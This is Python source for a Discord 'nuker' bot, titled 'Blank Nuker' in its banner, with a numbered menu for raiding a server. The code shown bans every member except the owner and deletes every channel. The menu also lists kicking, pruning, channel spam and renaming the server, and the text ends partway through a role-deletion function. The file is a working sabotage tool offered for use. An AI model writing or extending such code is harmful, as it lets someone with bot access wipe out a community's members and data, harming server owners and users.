import discord
from discord.ext import commands

# Function to securely load the token and prefix
def get_token_and_prefix():
    token = input("Enter your bot token: ")
    prefix = input("Enter your bot prefix: ")  # Fixed: Ensure you are getting the prefix
    return token, prefix  # Return both token and prefix

# Display banner function
def display_banner():
    banner_text = """
         /$$$$$$$  /$$                     /$$             /$$   /$$           /$$                          
| $$__  $$| $$                    | $$            | $$$ | $$          | $$                          
| $$  \\ $$| $$  /$$$$$$  /$$$$$$$ | $$   /$$      | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$ | $$ |____  $$| $$__  $$| $$  /$$/      | $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$__  $$| $$  /$$$$$$$| $$  \\ $$| $$$$$$/       | $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \\__/
| $$  \\ $$| $$ /$$__  $$| $$  | $$| $$_  $$       | $$\\\\  $$$| $$  | $$| $$_  $$ | $$_____/| $$      
| $$$$$$$/| $$|  $$$$$$$| $$  | $$| $$ \\\\  $$      | $$ \\\\  $$|  $$$$$$/| $$ \\\\  $$|  $$$$$$$| $$      
|_______/ |__/ \\\\_______/|__/  |__/|__/  \\\\__/      |__/  \\\\__/ \\\\______/ |__/  \\\\__/ \\\\_______/|__/      
"""
    print(banner_text)

# Bot setup
def main():
    # Securely load token and prefix
    token, prefix = get_token_and_prefix()

    # Set up intents
    intents = discord.Intents.default()
    intents.members = True
    intents.message_content = True

    # Initialize bot
    bot = commands.Bot(command_prefix=prefix, intents=intents)
    bot.remove_command("help")

    # Event for when the bot is ready
    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        print(f'Bot ID: {bot.user.id}')
        print('--- Ready for servers ---\n')
        display_banner()

    # Commands
    @bot.command()
    async def menu(ctx):
        """Display the numbered command list"""
        command_list = [
            "[1] - Ban all members",
            "[2] - Delete Channels",
            "[3] - Delete Roles",
            "[4] - Kick Members",
            "[5] - Prune Members",
            "[6] - Create Channels",
            "[7] - Spam All Channels",
            "[8] - Create Roles",
            "[9] - Delete Roles",
            "[10] - Rename Channels",
            "[11] - Rename Guild",
            "[12] - Rename Roles",
            "[13] - Credits",
            "[14] - Exit"
        ]
        menu_message = await ctx.send("\n".join(command_list))

        # Wait for user input (number selection)
        def check(m):
            return m.author == ctx.author and m.content.isdigit() and int(m.content) in range(1, 15)

        try:
            response = await bot.wait_for('message', check=check, timeout=30.0)
            number = int(response.content)
            await select_command(ctx, number)
        except discord.TimeoutError:
            await ctx.send("You took too long to respond! Please try again.")
        except Exception as e:
            await ctx.send(f"An error occurred: {str(e)}")

    @bot.command()
    async def select_command(ctx, number: int):
        """Execute the selected command based on number"""
        if number == 1:
            await ban_all(ctx)
        elif number == 2:
            await delete_channels(ctx)
        elif number == 3:
            await delete_roles(ctx)
        elif number == 4:
            await kick_all(ctx)
        elif number == 6:
            await create_channel(ctx, "new-channel")  # Example: create a channel with a default name
        elif number == 13:
            await ctx.send("Bot developed by [Your Name Here].")
        elif number == 14:
            await ctx.send("Exiting...")  # Just a placeholder, no exit logic
            await bot.close()
        else:
            await ctx.send("Invalid command number.")

    async def ban_all(ctx):
        """Ban all members in the server"""
        try:
            for member in ctx.guild.members:
                if member != ctx.guild.owner:  # Avoid banning the owner
                    await member.ban(reason="Banned by bot")
                    print(f"Banned {member.name}")
            await ctx.send("All members have been banned except the server owner.")
        except discord.Forbidden:
            await ctx.send("I don't have permission to ban members.")
        except discord.HTTPException:
            await ctx.send("Failed to ban the members.")

    async def delete_channels(ctx):
        """Delete all channels in the server"""
        try:
            for channel in ctx.guild.channels:
                await channel.delete()
                print(f"Deleted channel {channel.name}")
            await ctx.send("All channels have been deleted.")
        except discord.Forbidden:
            await ctx.send("I don't have permission to delete channels.")
        except discord.HTTPException:
            await ctx.send("Failed to delete the channels.")

    async def delete_roles(ctx